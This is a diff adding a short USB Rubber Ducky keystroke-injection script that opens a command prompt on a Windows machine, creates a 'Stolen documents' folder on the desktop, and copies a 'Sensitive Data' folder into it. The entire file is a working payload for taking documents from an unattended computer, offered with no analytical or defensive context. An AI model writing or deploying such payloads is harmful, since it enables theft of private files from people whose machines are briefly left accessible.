@@ -1,0 +1,13 @@
+REM AUTHOR KIERAN HUMAN
+
+DELAY 1000
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 1000
+STRING mkdir %USERPROFILE%\Desktop\"Stolen documents"
+ENTER
+DELAY 1000
+STRING xcopy %USERPROFILE%\Documents\"ZTW Documents"\"Sensitive Data"\* %USERPROFILE%\Desktop\"Stolen documents" /E /I /Y
+ENTER
